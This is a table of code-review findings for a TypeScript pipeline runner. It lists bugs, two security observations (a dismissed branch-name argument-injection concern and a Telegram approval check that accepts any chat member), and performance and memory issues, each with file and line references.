| ENH-2 | ✅ | `smart-runner.ts:352`: `PATH_TAKING_FLAGS = ["--config", "-c", "--project", "-p"]` — `pnpm --filter ./packages/api test` has `./packages/api` contain `/`, not preceded by a known flag → treated as the last path arg and replaced by scoped files (`:367-374`). |
| BUG-11 | ✅ | `crash-signals.ts:89`: `pidRegistry.freeze()` runs BEFORE `:93` `onShutdown` (which spawns `acpx sessions close`/`stop`); `pid-registry.ts:53-56` `register()` drops PIDs when frozen; `killAll()` (`:83-95`) iterates only the pre-freeze set. |
| BUG-12 | ✅ | `pipeline-result-handler.ts:46-51`: spawn with `stdout:"pipe", stderr:"pipe"`, then `await proc.exited` — streams never consumed; non-zero exit code neither logged nor checked (catch only fires on spawn throw). |
| BUG-13 | ✅ | `unified-executor.ts` parallel branch: after `reconcileBatchOutcome`/`savePRD` (`:342-345`) the branch reaches `continue` (`:423`) with no `ctx.statusWriter.setPrd/update`; sequential branch does it at `:529-531`. |
| BUG-14 | ✅ | `completedEarly` referenced only in `runner.ts:284` (read) and `runner-execution.ts:69` (type field); grep confirms nothing ever assigns it — branch is dead. |
| BUG-15 | ⚠️ | `tier-escalation.ts:350,370-395`: `delete` happens on cap-exceeded (`:373`) and on any non-runtime-crash outcome (`:395`), but NOT when a story has a retry-same then succeeds without another `handleTierEscalation` call — those entries persist for the process lifetime. Small, but real across many runs in one process (tests/watch). |
| SEC-10 | ❌ DISMISSED | `auto-pr/index.ts:189` does pass `context.branch` positionally, but git's own branch-name validation refuses names starting with `-` (`git branch`/`checkout`/`switch` reject leading-dash names; refname rules forbid whitespace), so a dash-leading checked-out branch — the precondition — cannot exist in practice. |
| SEC-11 | ✅ | `telegram.ts:407-410`: `isFromConfiguredChat` compares only `chat.id` — any member of the configured (possibly shared) chat can tap approve/abort/skip buttons. |
| PERF-2 | ✅ | `orchestrator.ts:116-125`: `controller.abort()` IS called on timeout, but the never-settling promise only discards the result — `provider.fetch` keeps running unless the provider honors the signal; built-in providers not audited for that. |
| PERF-3 | ✅ | `pid-registry.ts:176`: one `ps -eo pid=,ppid=,lstart=` spawn per tree plus `readProcessIdentity`/`signalIfUnchanged` per-target spawns (`ps -p`, `kill -0`, `kill`) — O(P×spawns), no timeout on `proc.exited` (can stall shutdown until the 10s hard deadline). |
| MEM-2 | ✅ | `usePipelineBusEvents.ts:178`: `escalationLog: [...prev.escalationLog, entry]` — append-only, never pruned; display caps at `MAX_ESCALATION_DISPLAY` (`LiveActivityPanel.tsx:59`). |
| MEM-3 | ✅ | `crash-heartbeat.ts:35-37`: `await _heartbeatDeps.sleep(60_000)` — `Bun.sleep` is not cancellable; after `stopHeartbeat()` (`:94-100`) the in-flight sleep keeps the event loop alive up to 60s (harmless in the CLI, which calls `process.exit`). |
